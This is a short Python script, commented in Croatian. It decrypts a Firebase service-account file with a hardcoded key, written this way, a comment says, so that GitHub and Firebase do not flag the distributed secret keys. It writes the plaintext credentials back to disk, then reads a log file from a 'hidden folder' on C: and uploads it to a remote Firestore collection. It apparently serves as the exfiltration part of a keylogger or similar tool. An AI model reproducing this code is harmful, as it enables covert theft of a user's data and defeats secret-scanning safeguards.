import subprocess
import sys
try:
    import firebase_admin
    from firebase_admin import credentials, firestore
    from cryptography.fernet import Fernet
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "firebase-admin"])
    subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])
    import firebase_admin
    from firebase_admin import credentials, firestore
    from cryptography.fernet import Fernet

#####################################################################################################

# Enkripcijski kljuc koji sam generiro fernet metodom.
fernet = Fernet('HRpsf2pVzSwg4wCBs4Nx-uT9nwZepyyjyZ6uhAwfnDM=')
 
# otvaram enkriptirani file da ga mogu procitati
with open('jako_safe_nacin_za_distribuiranje_tajni.json', 'rb') as enc_file:
    encrypted = enc_file.read()
 
# dekriptiram podatke iz njega
decrypted = fernet.decrypt(encrypted)
 
# prepisujem enkriptirane podatke dekriptiranima
with open('jako_safe_nacin_za_distribuiranje_tajni.json', 'wb') as dec_file:
    dec_file.write(decrypted)

#Sve ovo kako mi github i firebase nebi plakali da sam distribuiro tajne kljuceve

#####################################################################################################

cred = credentials.Certificate("jako_safe_nacin_za_distribuiranje_tajni.json")
firebase_admin.initialize_app(cred)

# Poveži se na Firestore
db = firestore.client()

# Pročitaj sadržaj tekstualne datoteke
file_path = r"c:\skriveni_folder\log.txt"
with open(file_path, "r", encoding="utf-8") as file:
    text_content = file.read()

# Kreiraj dokument u kolekciji 'logs'
doc_ref = db.collection("logs").add({"content": text_content})
